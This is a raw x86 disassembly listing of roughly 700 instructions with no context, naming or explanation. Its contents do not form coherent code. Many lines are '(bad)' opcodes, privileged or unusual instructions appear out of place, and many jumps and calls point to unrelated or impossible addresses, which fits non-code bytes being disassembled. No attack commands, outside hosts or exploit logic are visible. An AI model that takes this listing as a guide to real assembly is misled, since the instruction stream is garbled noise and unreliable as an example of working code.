  4317b5:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4317b9:	inc    DWORD PTR [eax+esi*8]
  4317bc:	inc    ebp
  4317bd:	stos   BYTE PTR es:[edi],al
  4317be:	mov    edx,DWORD PTR [ebp-0x4]
  4317c1:	add    DWORD PTR [ebp-0x1c],eax
  4317c4:	mov    edx,DWORD PTR [ebp-0x70]
  4317c7:	cmp    eax,DWORD PTR [eax]
  4317c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4317ca:	mov    eax,DWORD PTR [eax]
  4317cc:	cld    
  4317cd:	jae    0x43174f
  4317cf:	add    eax,DWORD PTR [ecx]
  4317d1:	clc    
  4317d2:	add    BYTE PTR [eax+0x30],dl
  4317d5:	mov    DWORD PTR [ecx],esi
  4317d7:	clc    
  4317d8:	pop    ds
  4317d9:	inc    ebp
  4317da:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  4317e0:	(bad)  
  4317e1:	push   DWORD PTR [edi]
  4317e3:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  4317e9:	(bad)  
  4317ea:	jae    0x4317eb
  4317ec:	mov    eax,DWORD PTR [ebp-0x740175]
  4317f2:	sub    eax,DWORD PTR [eax]
  4317f4:	add    eax,DWORD PTR [eax]
  4317f6:	mov    DWORD PTR [ecx+0x5f],eax
  4317f9:	mov    DWORD PTR [ebx-0x4],ebx
  4317fc:	ret    0xff
  4317ff:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431805:	ret    
  431806:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43180c:	add    BYTE PTR [ebp-0x7d],al
  43180f:	mov    DWORD PTR [eax],eax
  431811:	add    al,0x84
  431813:	inc    DWORD PTR [ecx]
  431815:	lea    eax,[eax]
  431817:	hlt    
  431818:	sar    bh,cl
  43181a:	test   BYTE PTR [eax+0x1],dl
  43181d:	inc    ebp
  43181e:	add    BYTE PTR [ebx],dh
  431820:	test   BYTE PTR [ebx],0x84
  431823:	push   eax
  431824:	add    BYTE PTR [ebp+0x0],al
  431827:	add    eax,0x86
  43182c:	add    BYTE PTR [ebx-0x7f7b0340],cl
  431832:	add    BYTE PTR [ecx],al
  431834:	add    BYTE PTR [eax],al
  431836:	mov    esi,0x550030
  43183b:	mov    ecx,DWORD PTR [edi]
  43183d:	cld    
  43183e:	fidiv  DWORD PTR [ebp+0x0]
  431841:	mov    edi,DWORD PTR [ecx]
  431843:	xor    BYTE PTR [eax+eax*1],0x84
  431847:	add    eax,DWORD PTR [eax]
  431849:	sbb    BYTE PTR [eax],al
  43184b:	jne    0x4317fe
  43184d:	mov    eax,DWORD PTR [ecx]
  43184f:	sbb    BYTE PTR [eax],al
  431851:	mov    DWORD PTR [ebp-0x1],esp
  431854:	add    BYTE PTR [eax+0x30e45ca],bh
  43185a:	ret    0xb7fc
  43185d:	dec    ebp
  43185e:	or     al,0x89
  431860:	dec    ebp
  431861:	cld    
  431862:	cmovne ecx,DWORD PTR [eax-0x75]
  431866:	add    edi,esp
  431868:	seto   BYTE PTR [esi-0x72ffffff]
  43186f:	inc    ebp
  431870:	adc    al,0x8b
  431872:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  431879:	cmp    DWORD PTR [edi+0x72],edx
  43187c:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  431882:	gs cmp al,0x0
  431885:	je     0x43185d
  431887:	push   eax
  431888:	sar    BYTE PTR [eax],1
  43188a:	mov    bh,0x3e
  43188c:	push   cs
  43188d:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  431893:	add    DWORD PTR [ecx+0x12],ebp
  431896:	dec    edx
  431897:	(bad)  
  431898:	mov    eax,edx
  43189a:	in     al,dx
  43189b:	adc    DWORD PTR [ecx],esi
  43189d:	pop    esi
  43189e:	inc    ecx
  43189f:	leave  
  4318a0:	or     DWORD PTR [eax],ebx
  4318a2:	gs push ebp
  4318a4:	add    ah,ch
  4318a6:	into   
  4318a7:	in     al,dx
  4318a8:	enter  0xb756,0xf0
  4318ac:	push   cs
  4318ad:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4318b7:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4318bd:	jnp    0x74439dc5
  4318c3:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  4318c9:	add    BYTE PTR [edi],cl
  4318cb:	mov    edi,DWORD PTR [ecx-0x78]
  4318ce:	ltr    WORD PTR [ecx-0x7b]
  4318d2:	dec    DWORD PTR [edi]
  4318d4:	clc    
  4318d5:	out    0x45,eax
  4318d7:	add    BYTE PTR [eax],cl
  4318d9:	cmp    ebx,0xffffff8c
  4318dc:	jge    0x4318de
  4318de:	jb     0x4318f0
  4318e0:	je     0x521960
  4318e6:	pop    edx
  4318e7:	push   esi
  4318e8:	mov    ecx,DWORD PTR [edi]
  4318ea:	in     al,dx
  4318eb:	rol    DWORD PTR [ebp+0x0],1
  4318ee:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  4318f5:	cmp    DWORD PTR [ecx],0xfffffff0
  4318f8:	hlt    
  4318f9:	mov    esp,DWORD PTR [eax+0xf034d2b]
  4318ff:	(bad)  
  431901:	push   eax
  431902:	jns    0xb842fd80
  431908:	lock push cs
  43190a:	ror    edx,0x3
  43190d:	test   BYTE PTR [ecx+0x5500e800],cl
  431913:	dec    eax
  431914:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431918:	(bad)  
  431919:	mov    esi,0x7f33ff5f
  43191e:	inc    eax
  43191f:	test   DWORD PTR [edx],eax
  431921:	je     0x4318e3
  431923:	mov    ecx,ecx
  431925:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431929:	and    eax,DWORD PTR [eax+0xf0103]
  43192f:	jp     0x43191d
  431931:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431935:	add    edx,DWORD PTR [edi+0x74]
  431938:	sbb    BYTE PTR [ebp+0x4d001484],cl
  43193e:	add    BYTE PTR [ebp-0x74c48bbb],al
  431944:	je     0x4318c9
  431946:	cmp    eax,edi
  431948:	js     0x43196d
  43194a:	add    eax,0xeb0fc003
  43194f:	jns    0x4318dc
  431951:	vmread DWORD PTR [ecx+0x45],ebx
  431955:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  43195b:	adc    al,0x8b
  43195d:	jge    0x431973
  43195f:	mov    edi,DWORD PTR [eax-0x4]
  431962:	add    edi,DWORD PTR [edi]
  431964:	or     bh,bh
  431966:	push   ebp
  431967:	push   es
  431968:	mov    DWORD PTR [ebp-0x4],ebx
  43196b:	add    edi,esi
  43196d:	pop    es
  43196e:	add    esi,DWORD PTR [edi-0x48ccf183]
  431974:	mov    DWORD PTR [esp+esi*8],ecx
  431977:	inc    ebp
  431978:	pop    ebp
  431979:	xor    DWORD PTR [esi-0x4],0x3b
  43197d:	add    edx,DWORD PTR [ecx+edi*1]
  431980:	push   es
  431981:	clc    
  431982:	mov    bh,0xdb
  431984:	jp     0x43193d
  431986:	add    cl,BYTE PTR [esi]
  431988:	div    DWORD PTR [edi+0x4d8b0c1c]
  43198e:	test   edi,edi
  431990:	je     0x431986
  431992:	mov    eax,ecx
  431994:	or     BYTE PTR [ebx],al
  431996:	dec    BYTE PTR [ecx+0x7d3bec7d]
  43199c:	jbe    0x431a10
  43199e:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  4319a4:	add    ecx,DWORD PTR [esi]
  4319a6:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4319ac:	add    eax,DWORD PTR [ebx-0x287af783]
  4319b2:	je     0x431a01
  4319b4:	mov    DWORD PTR [ecx],edi
  4319b6:	mov    esi,eax
  4319b8:	hlt    
  4319b9:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  4319c0:	jb     0x431982
  4319c2:	jmp    0x4319af
  4319c4:	xor    esi,DWORD PTR [ebx]
  4319c6:	pop    edi
  4319c7:	pop    esi
  4319c8:	pop    ebx
  4319c9:	ret    
  4319ca:	ret    0x8b
  4319cd:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  4319d3:	xor    DWORD PTR ds:0x89339c0c,0x56
  4319da:	cld    
  4319db:	cmp    DWORD PTR [ebp+0xf],eax
  4319de:	xor    al,0x85
  4319e0:	pushf  
  4319e1:	add    BYTE PTR [ebx+0x4d0cfc8b],cl
  4319e7:	ret    
  4319e8:	mov    edi,DWORD PTR [esi-0x4]
  4319eb:	pop    eax
  4319ec:	dec    ebp
  4319ed:	jne    0x43197a
  4319ef:	xor    edi,esp
  4319f1:	inc    eax
  4319f2:	dec    ebp
  4319f3:	jbe    0x431a48
  4319f5:	inc    eax
  4319f6:	pop    ebp
  4319f7:	add    edx,DWORD PTR [esi+0x8]
  4319fa:	push   ebx
  4319fb:	dec    eax
  4319fc:	push   ecx
  4319fd:	mov    eax,edi
  4319ff:	and    al,0xf0
  431a01:	jo     0x4319ee
  431a03:	mov    eax,DWORD PTR [ebx]
  431a05:	sbb    BYTE PTR [ebp+0x4d],cl
  431a08:	mov    eax,DWORD PTR [ebx]
  431a0a:	nop
  431a0b:	or     BYTE PTR [eax],al
  431a0d:	jne    0x431a66
  431a0f:	cmp    ebx,DWORD PTR [edx+0x33893277]
  431a15:	cld    
  431a16:	xor    edi,edi
  431a18:	add    edi,DWORD PTR [ebp+0x3]
  431a1b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431a21:	js     0x4319a7
  431a23:	jae    0x431a27
  431a25:	(bad)  
  431a27:	xor    al,0x5d
  431a29:	jmp    0x4319b6
  431a2b:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431a32:	fdecstp 
  431a34:	test   BYTE PTR [edi],ah
  431a36:	add    bh,BYTE PTR [ebp+0x0]
  431a39:	add    ebx,DWORD PTR [ebp-0x77]
  431a3c:	mov    edi,eax
  431a3e:	cmp    al,0x0
  431a41:	adc    dh,BYTE PTR [ebx]
  431a43:	jge    0x431a48
  431a45:	mov    edi,DWORD PTR [ebx]
  431a47:	jl     0x431a58
  431a49:	clc    
  431a4a:	dec    edi
  431a4b:	jge    0x431a4d
  431a4d:	mov    eax,DWORD PTR [ebx]
  431a4f:	jb     0x431a59
  431a51:	mov    ecx,DWORD PTR [ebp-0x8]
  431a54:	mov    edi,edi
  431a56:	xor    edx,DWORD PTR [eax]
  431a58:	add    edi,DWORD PTR [ebx]
  431a5a:	mov    DWORD PTR [ebp-0x10],edi
  431a5d:	inc    edi
  431a5e:	pop    ebp
  431a5f:	jge    0x431a9c
  431a61:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431a65:	mov    edx,0xc05d87f0
  431a6a:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431a6e:	fimul  WORD PTR [eax]
  431a70:	fist   WORD PTR [ebp+0x1c]
  431a73:	in     al,dx
  431a74:	jne    0x431a62
  431a76:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431a7c:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431a80:	fdivp  st(0),st
  431a82:	fild   WORD PTR [ebp+0x4510f85c]
  431a88:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431a8e:	inc    ebp
  431a8f:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431a95:	mov    ebp,DWORD PTR [ebx-0x4]
  431a98:	adc    al,0x8b
  431a9a:	rcl    DWORD PTR [eax],0x48
  431a9d:	mov    esi,0x7080803
  431aa2:	fiadd  WORD PTR [ebp+0x4d]
  431aa5:	(bad)  
  431aa6:	mov    edx,DWORD PTR [edx-0x4]
  431aa9:	mov    edx,DWORD PTR [ebp-0x4]
  431aac:	xor    ebx,DWORD PTR [ebx+0x330103]
  431ab2:	mov    DWORD PTR [edi+0x872dc],edi
  431ab8:	xlat   BYTE PTR ds:[ebx]
  431ab9:	into   
  431aba:	ffreep st(6)
  431abc:	retf   0x6c7
  431abf:	iret   
  431ac0:	dec    ebp
  431ac1:	inc    ebp
  431ac2:	mov    DWORD PTR [ebx],edi
  431ac4:	fmul   QWORD PTR [edi]
  431ac6:	dec    ebp
  431ac7:	jnp    0x431afc
  431ac9:	add    BYTE PTR [ebx],al
  431acb:	mov    ecx,DWORD PTR [esp+edi*8]
  431ace:	inc    ebp
  431acf:	dec    ebp
  431ad0:	lea    esi,[ebx]
  431ad2:	add    DWORD PTR [ebx],eax
  431ad4:	jb     0x431b11
  431ad6:	add    BYTE PTR [edi],cl
  431ad8:	inc    ebp
  431ad9:	imul   eax,edi,0x858bd800
  431adf:	cld    
  431ae0:	clc    
  431ae1:	mov    DWORD PTR [ebp+0x0],eax
  431ae4:	inc    DWORD PTR [eax]
  431ae6:	or     al,0xde
  431ae8:	sbb    bh,0x1
  431aeb:	retf   
  431aec:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431af3:	dec    ebp
  431af4:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431afa:	enter  0x12de,0xdf
  431afe:	inc    ebp
  431aff:	pop    ebp
  431b00:	dec    DWORD PTR [ebx-0x257f0ff4]
  431b06:	add    DWORD PTR [edx],edx
  431b08:	add    BYTE PTR [ebp+0x50],dl
  431b0b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431b11:	xor    ecx,DWORD PTR [ebx+eax*1+0xac73966]
  431b18:	loopne 0x431b31
  431b1a:	cdq    
  431b1b:	push   ebp
  431b1c:	clc    
  431b1d:	mov    eax,DWORD PTR [ebp-0x4]
  431b20:	xor    edx,edx
  431b22:	add    esi,DWORD PTR [ebx]
  431b24:	cmp    eax,DWORD PTR [ebx]
  431b26:	hlt    
  431b27:	cmp    DWORD PTR [ebx],esp
  431b29:	or     al,BYTE PTR [ebp+0xf]
  431b2c:	mov    eax,DWORD PTR [edx]
  431b2e:	loopne 0x431b30
  431b30:	(bad)  
  431b31:	mov    ecx,esi
  431b33:	cld    
  431b34:	pushf  
  431b35:	pop    ebp
  431b36:	call   0x10c0:0x8bf0328b
  431b3d:	add    eax,DWORD PTR [eax+0x10018b]
  431b43:	dec    ebp
  431b44:	iret   
  431b45:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431b4b:	dec    ebp
  431b4c:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431b52:	(bad)  
  431b53:	iret   
  431b54:	inc    ebp
  431b55:	(bad)  
  431b56:	jne    0x431ba5
  431b58:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431b5e:	(bad)  
  431b5f:	cmp    ebx,eax
  431b61:	je     0x431ae9
  431b63:	add    edi,edi
  431b65:	or     bh,bh
  431b67:	dec    ebp
  431b68:	inc    ebp
  431b69:	mov    esi,DWORD PTR [ebx]
  431b6b:	cld    
  431b6c:	add    ecx,esi
  431b6e:	cmp    ecx,DWORD PTR [eax-0xc]
  431b71:	mov    edx,DWORD PTR [edi]
  431b73:	or     BYTE PTR [ebp-0x7c],al
  431b76:	mov    ebx,DWORD PTR [edx-0x7639cd18]
  431b7c:	test   BYTE PTR [edx+ebx*4],cl
  431b7f:	inc    ebp
  431b80:	xor    bh,BYTE PTR [eax]
  431b82:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431b89:	jne    0x431b52
  431b8b:	mov    ebp,esp
  431b8d:	fcomp  DWORD PTR [ebx]
  431b8f:	add    BYTE PTR [ecx],al
  431b91:	inc    DWORD PTR [ebp-0x75]
  431b94:	(bad)  
  431b95:	cld    
  431b96:	add    al,0xce
  431b98:	mov    ecx,edi
  431b9a:	cld    
  431b9b:	inc    ebp
  431b9c:	fidivr WORD PTR [ebx]
  431b9e:	fbstp  TBYTE PTR [ebp-0x3e]
  431ba1:	mov    eax,DWORD PTR [eax]
  431ba3:	adc    BYTE PTR [ebx-0x3974038b],cl
  431ba9:	fadd   st,st(7)
  431bab:	add    BYTE PTR [ebp-0x1],al
  431bae:	mov    ecx,DWORD PTR [esp+edi*8]
  431bb1:	inc    ebp
  431bb2:	mov    bh,0xc7
  431bb5:	loopne 0x431bfc
  431bb7:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431bbd:	sbb    al,0x33
  431bbf:	pushf  
  431bc0:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431bc6:	mov    eax,edi
  431bc8:	cwde   
  431bc9:	inc    ebp
  431bca:	inc    ebp
  431bcb:	jne    0x431b58
  431bcd:	mov    esp,esp
  431bcf:	clc    
  431bd0:	add    al,0x4d
  431bd2:	mov    DWORD PTR [ebx],esi
  431bd4:	or     al,0x33
  431bd6:	inc    ebp
  431bd7:	lea    ecx,[ebx-0x398d13fd]
  431bdd:	add    bh,al
  431bdf:	inc    ebp
  431be0:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431be7:	add    ebp,esp
  431be9:	shufps xmm1,xmm3,0xc7
  431bed:	(bad)  
  431bee:	jmp    0x74885717
  431bf3:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431bf9:	hlt    
  431bfa:	mov    ecx,DWORD PTR [edi]
  431bfc:	fadd   DWORD PTR [ebp+0x0]
  431bff:	xor    ecx,DWORD PTR [edi]
  431c01:	add    ecx,ecx
  431c03:	cmp    edi,edi
  431c05:	pmuludq mm7,QWORD PTR [edx+0x50]
  431c09:	(bad)  
  431c0a:	jmp    0x431b97
  431c0c:	mov    edi,esp
  431c0e:	or     al,0xc6
  431c10:	inc    ebp
  431c11:	(bad)  
  431c12:	mov    eax,DWORD PTR [ebp+0x10]
  431c15:	jne    0x431ba0
  431c17:	mov    eax,DWORD PTR [ecx]
  431c19:	clc    
  431c1a:	add    BYTE PTR [ebp-0x40],cl
  431c1d:	xor    edx,DWORD PTR [eax-0x73]
  431c20:	jne    0x431c23
  431c22:	push   DWORD PTR [edx+0x8]
  431c25:	add    BYTE PTR [ebp+0x45],al
  431c28:	mov    ebp,ecx
  431c2a:	cld    
  431c2b:	add    BYTE PTR [ebp+0x0],cl
  431c2e:	xor    eax,DWORD PTR [ebp+0x3]
  431c31:	lea    edi,[ebx]
  431c33:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431c39:	sub    eax,0x5d330e4d
  431c3e:	lea    esi,[ebx]
  431c40:	add    DWORD PTR [ebx],eax
  431c42:	jb     0x431c2d
  431c44:	add    BYTE PTR [eax],al
  431c46:	inc    ebp
  431c47:	add    bl,ch
  431c49:	inc    ebp
  431c4a:	mov    esi,DWORD PTR [ebx]
  431c4c:	or     al,0x3
  431c4e:	(bad)  
  431c4f:	mov    edi,eax
  431c51:	in     al,dx
  431c52:	scas   eax,DWORD PTR es:[edi]
  431c53:	inc    ebp
  431c54:	mov    esi,DWORD PTR [ebx]
  431c56:	in     al,0x3
  431c58:	add    al,0x89
  431c5a:	mov    ecx,DWORD PTR [eax+edi*8]
  431c5d:	dec    ebp
  431c5e:	(bad)  
  431c5f:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3166]
  431c66:	mov    ecx,eax
  431c68:	cld    
  431c69:	push   es
  431c6a:	dec    ebp
  431c6b:	add    al,0x33
  431c6d:	mov    DWORD PTR [ebx],eax
  431c6f:	in     al,dx
  431c70:	cmp    DWORD PTR [ebp-0x67],eax
  431c73:	mov    eax,DWORD PTR [ebp-0xba0068]
  431c79:	mov    edx,DWORD PTR [ebp-0x4]
  431c7c:	mov    ecx,DWORD PTR [ebp-0x2c]
  431c7f:	xor    eax,DWORD PTR [ebp+0x3]
  431c82:	cmp    DWORD PTR [ebx],0x8b327499
  431c88:	xor    edi,esp
  431c8a:	jmp    0xff7719dc
  431c8f:	add    ecx,DWORD PTR [ebp-0x3f]
  431c92:	xor    ebx,DWORD PTR [edi]
  431c94:	add    eax,ecx
  431c96:	cmp    ebx,DWORD PTR [eax]
  431c98:	mov    ecx,DWORD PTR [ebp-0x4]
  431c9b:	mov    ecx,DWORD PTR [eax]
  431c9d:	adc    BYTE PTR [ebp-0x80],al
  431ca0:	jmp    0x431ca3
  431ca2:	mov    eax,DWORD PTR [eax]
  431ca4:	cld    
  431ca5:	mov    bh,0xc6
  431ca7:	push   ecx
  431ca8:	(bad)  
  431ca9:	jne    0x431d09
  431cab:	dec    ecx
  431cad:	or     BYTE PTR [ecx+ebx*1],cl
  431cb0:	push   ebp
  431cb1:	inc    ebp
  431cb2:	in     al,dx
  431cb3:	add    ebp,esp
  431cb5:	or     bh,al
  431cb7:	dec    ebp
  431cb8:	cld    
  431cb9:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431cbf:	xor    DWORD PTR [edx+eax*1],0xffffff9c
  431cc3:	dec    DWORD PTR [ebx+0x45510cf4]
  431cc9:	mov    DWORD PTR [ebx+0x5345fc0c],ecx
  431ccf:	mov    edx,DWORD PTR [ecx+0xc]
  431cd2:	xor    eax,esi
  431cd4:	mov    edx,0xc172c7
  431cd9:	inc    ebp
  431cda:	mov    esi,DWORD PTR [ebp+0x8]
  431cdd:	mov    eax,edx
  431cdf:	call   0x84c7e3d4
  431ce4:	add    DWORD PTR [edx-0x76bace00],ebx
  431cea:	mov    ebp,eax
  431cec:	or     BYTE PTR [eax],dl
  431cee:	jo     0x431d3d
  431cf0:	push   edi
  431cf1:	xor    esi,DWORD PTR [ebp+0x3]
  431cf4:	(bad)  
  431cf5:	pmulhuw mm0,mm1
  431cf8:	test   DWORD PTR [ebp-0x8],ecx
  431cfb:	mov    DWORD PTR [ebp-0x67],eax
  431cfe:	mov    eax,DWORD PTR [ebp-0x4]
  431d01:	xor    edi,DWORD PTR [ebp-0x73]
  431d04:	xor    eax,DWORD PTR [ebx]
  431d06:	xor    esi,DWORD PTR [edx+0x3]
  431d09:	add    BYTE PTR [ecx],bh
  431d0b:	inc    ebp
  431d0c:	(bad)  
  431d0d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431d13:	mov    DWORD PTR [eax],0x750f0004
  431d19:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431d1f:	lock add BYTE PTR [ebp+0x0],cl
  431d23:	mov    esi,DWORD PTR [ebp-0x18]
  431d26:	mov    ebp,edx
  431d28:	or     al,0x72
  431d2a:	ja     0x431d2c
  431d2c:	mov    edx,esi
  431d2e:	cld    
  431d2f:	(bad)  
  431d32:	cli    
  431d33:	mov    esi,DWORD PTR [ebp-0x4]
  431d36:	cmp    ecx,esi
  431d38:	bswap  edi
  431d3a:	(bad)
  431d3e:	mov    esi,DWORD PTR [ebp-0x4]
  431d41:	mov    esi,ecx
  431d43:	clc    
  431d44:	repnz add esi,DWORD PTR [ebp+0x45]
  431d48:	push   ebx
  431d49:	xor    eax,DWORD PTR [ebp+0x3]
  431d4c:	cmp    bl,BYTE PTR [edi-0x64]
  431d4f:	pop    ebx
  431d50:	jmp    0x431e17
  431d55:	mov    esi,DWORD PTR [ebp-0x7d]
  431d58:	xor    ebp,DWORD PTR [eax]
  431d5a:	lea    eax,[ebp-0x8]
  431d5d:	xor    eax,0xc7ef9cf2
  431d62:	neg    eax
  431d64:	ins    DWORD PTR es:[edi],dx
  431d65:	test   esi,edi
  431d67:	clc    
  431d68:	pop    esp
  431d69:	inc    ebp
  431d6a:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431d70:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431d76:	add    cl,al
  431d78:	jne    0x431d14
  431d7a:	mov    esi,DWORD PTR [edx]
  431d7c:	in     al,dx
  431d7d:	push   esi
  431d7e:	xor    BYTE PTR [ebp-0xe],dh
  431d81:	add    edi,esi
  431d83:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431d89:	add    cl,bh
  431d8b:	mov    edi,DWORD PTR [ebp+0x8]
  431d8e:	mov    DWORD PTR [ebp-0x14],esi
  431d91:	add    esi,DWORD PTR [ebp+0x3c]
  431d94:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431d9a:	mov    ah,0x38
  431d9c:	call   0xe0e4:0x898b329c
  431da3:	jne    0x431e1a
  431da5:	mov    ecx,DWORD PTR [ebx-0xe0e13f4]
  431dab:	shl    edx,0xf2
  431dae:	(bad)  
  431daf:	mov    ah,0x16
  431db1:	dec    eax
  431db2:	jne    0x431d47
  431db4:	mov    ecx,DWORD PTR [edi]
  431db6:	in     al,dx
  431db7:	jmp    0x431daa
  431db9:	add    dl,dh
  431dbb:	mov    edi,esi
  431dbd:	or     al,0x8
  431dbf:	inc    ebp
  431dc0:	jne    0x431dc5
  431dc2:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431dc8:	ret    
  431dc9:	or     bh,bh
  431dcb:	jge    0x431db5
  431dcd:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431dd3:	xor    edi,eax
  431dd5:	add    esi,DWORD PTR [ebp-0x77]
  431dd8:	mov    ebx,esp
  431dda:	clc    
  431ddb:	neg    DWORD PTR [ebp-0x7c]
  431dde:	xor    eax,DWORD PTR [eax]
  431de0:	cmp    eax,DWORD PTR [eax]
  431de2:	repz jne 0x431d7a
  431de5:	xor    eax,DWORD PTR [ecx]
  431de7:	add    ebx,DWORD PTR [eax]
  431de9:	mov    DWORD PTR [ebp-0x8],eax
  431dec:	mov    eax,edi
  431dee:	cld    
  431def:	lock pop eax
  431df1:	test   DWORD PTR [ebx],esi
  431df3:	clc    
  431df4:	add    edx,DWORD PTR [edi-0x740bff77]
  431dfa:	fdivp  st(4),st
  431dfc:	test   ecx,esi
  431dfe:	(bad)  
  431dff:	jnp    0x431e00
  431e01:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431e07:	jae    0x431d94
  431e09:	sub    edi,esp
  431e0b:	(bad)  
  431e0c:	shl    DWORD PTR [eax-0x3e],0x89
  431e10:	leave  
  431e11:	call   0x8198d51e
  431e16:	in     al,dx
  431e17:	(bad)  
  431e18:	in     al,dx
  431e19:	add    bh,al
  431e1b:	mov    esp,edi
  431e1d:	in     al,dx
  431e1e:	test   DWORD PTR [ebp-0x8],edi
  431e21:	mov    eax,DWORD PTR [ebp+0x2b]
  431e24:	xor    al,0x3
  431e26:	pushf  
  431e27:	jnp    0x57321a60
  431e2d:	xor    edx,DWORD PTR [ebx-0x77]
  431e30:	push   ecx
  431e31:	loopne 0x431e66
  431e33:	jne    0x431df0
  431e35:	mov    esi,DWORD PTR [edx-0x20]
  431e38:	add    BYTE PTR [ebp-0x3d],bh
  431e3b:	xor    eax,DWORD PTR [ebp-0x73]
  431e3e:	mov    edi,DWORD PTR [esi]
  431e40:	cld    
  431e41:	jb     0x431e09
  431e43:	add    bl,al
  431e45:	jne    0x431e8c
  431e47:	mov    edx,DWORD PTR [edi-0x10]
  431e4a:	jge    0x431ec9
  431e4c:	mov    esi,DWORD PTR [ebx]
  431e4e:	lock add ecx,DWORD PTR [ebp+0x3b]
  431e52:	xor    esi,DWORD PTR [ebp-0x77]
  431e55:	mov    esi,eax
  431e57:	lock inc ebp
  431e59:	jge    0x431e90
  431e5b:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431e62:	dec    ebp
  431e63:	mov    esi,DWORD PTR [ebx]
  431e65:	loopne 0x431df0
  431e67:	jge    0x431e61
  431e69:	add    DWORD PTR [ebp-0x7d],eax
  431e6c:	cmc    
  431e6d:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431e74:	dec    ebp
  431e75:	hlt    
  431e76:	xor    ebx,DWORD PTR [ebp-0x77]
  431e79:	mov    esi,esp
  431e7b:	in     al,0x45
  431e7d:	jge    0x431eb8
  431e7f:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431e86:	dec    ebp
  431e87:	dec    esp
  431e88:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431e8e:	inc    ebp
  431e8f:	hlt    
  431e90:	xor    eax,0xb88b9f75
  431e95:	add    al,0x95
  431e97:	icebp  
  431e98:	add    dl,dh
  431e9a:	mov    DWORD PTR [ebp+0x20],ebx
  431e9d:	cmp    eax,DWORD PTR [ebp+0xf]
  431ea0:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431ea4:	fistp  WORD PTR [ebx+0x0]
  431ea7:	inc    ebp
  431ea8:	mov    ebx,DWORD PTR [edi+0xc]
  431eab:	add    eax,eax
  431ead:	inc    ebp
  431eae:	test   BYTE PTR [ebx],dh
  431eb0:	add    eax,DWORD PTR [ebx]
  431eb2:	add    BYTE PTR [esi+0x45],bl
  431eb5:	ret    0x85
  431eb8:	jnp    0x5443a287
  431ebe:	inc    bp
  431ec0:	inc    ebp
  431ec1:	xor    eax,0xc78a9cb9
  431ec6:	add    ah,bl
  431ec8:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  431ece:	add    BYTE PTR [ebx+0x3],dl
  431ed1:	mov    esi,0x708088b
  431ed6:	cmp    esi,eax
  431ed8:	setp   BYTE PTR [ecx-0x74fcffce]
  431edf:	mov    esp,edi
  431ee1:	call   0x33ce6433
  431ee6:	or     BYTE PTR [ebx],al
  431ee8:	inc    ecx
  431ee9:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431eef:	and    BYTE PTR [ebp-0x7074f0bb],al
  431ef5:	lock add cl,al
  431ef8:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431eff:	mov    ch,0x45
  431f01:	clc    
  431f02:	xor    eax,DWORD PTR [ebp+0x3]
  431f05:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431f0b:	inc    ebp
  431f0c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431f12:	mov    edi,eax
  431f14:	mov    eax,DWORD PTR [ebp+0x3c]
  431f17:	mov    ecx,DWORD PTR [eax]
  431f19:	hlt    
  431f1a:	inc    ebp
  431f1b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431f22:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431f28:	push   ebp
  431f29:	mov    edi,DWORD PTR [ebx]
  431f2b:	in     al,dx
